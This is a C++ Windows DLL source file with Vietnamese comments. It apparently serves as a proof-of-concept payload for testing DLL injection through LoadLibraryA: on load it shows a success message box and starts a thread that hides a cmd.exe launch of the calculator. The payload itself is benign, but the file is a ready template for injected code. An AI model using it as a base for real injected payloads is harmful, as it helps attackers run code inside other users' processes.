#include "pch.h"
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

// Luồng Thread phụ độc lập xử lý lệnh mở máy tính để né tránh hàng rào Loader Lock
DWORD WINAPI LaunchPayload(LPVOID lpParam) {
    WinExec("cmd.exe /c start calc", SW_HIDE);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
    { // <--- THÊM DẤU NGOẶC NHỌN MỞ ĐỂ CÔ LẬP PHẠM VI SỐNG

        // Bước kiểm chứng trực quan kịch trần
        MessageBoxA(NULL, "DLL Injected successfully via LoadLibraryA!", "Success Info", MB_OK | MB_ICONINFORMATION);

        // Tạo luồng phụ để kích nổ calc.exe an toàn tuyệt đối
        HANDLE hThread = CreateThread(NULL, 0, LaunchPayload, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        break;

    } // <--- THÊM DẤU NGOẶC NHỌN ĐÓNG TẠI ĐÂY
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}